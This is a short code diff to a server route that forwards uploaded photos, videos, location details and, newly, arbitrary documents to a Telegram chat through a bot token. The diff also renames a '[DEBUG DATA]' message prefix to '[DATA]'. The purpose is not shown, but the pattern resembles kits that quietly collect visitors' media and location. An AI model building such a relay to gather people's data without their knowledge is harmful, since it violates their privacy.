@@ -5,6 +5,7 @@ export async function POST(request: Request) {
     const data = await request.formData();
     const photo = data.get("photo") as File | null;
     const video = data.get("video") as File | null;
+    const document = data.get("document") as File | null;
     const locationInfo = data.get("locationInfo") as string | null;
 
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -25,7 +26,7 @@ export async function POST(request: Request) {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          text: `[DEBUG DATA]\n\n${locationInfo}`,
+          text: `[DATA]\n\n${locationInfo}`,
         }),
       });
     }
@@ -53,6 +54,19 @@ export async function POST(request: Request) {
       await fetch(videoUrl, {
         method: "POST",
         body: videoFormData,
+      });
+    }
+
+    // 4. Send Document (file upload)
+    if (document && document.size > 0) {
+      const docFormData = new FormData();
+      docFormData.append("chat_id", chatId);
+      docFormData.append("document", document);
+
+      const docUrl = `https://api.telegram.org/bot${botToken}/sendDocument`;
+      await fetch(docUrl, {
+        method: "POST",
+        body: docFormData,
       });
     }
 
